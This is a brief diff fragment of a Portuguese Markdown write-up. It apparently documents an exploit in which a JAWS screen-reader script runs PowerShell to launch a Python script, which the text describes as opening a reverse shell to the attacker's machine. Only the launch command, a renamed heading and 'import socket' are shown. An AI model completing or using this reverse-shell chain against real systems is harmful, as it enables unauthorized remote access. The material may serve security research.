@@ -78,7 +78,7 @@ Run ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe python C:\\
 EndScript
 ```
 
-## Script JAWS: `NCPythonCall`
+## Script python: `ncat.py`
 O script Python estabelece uma conexão de shell reverso com a máquina especificada do atacante.
 ```python
 import socket
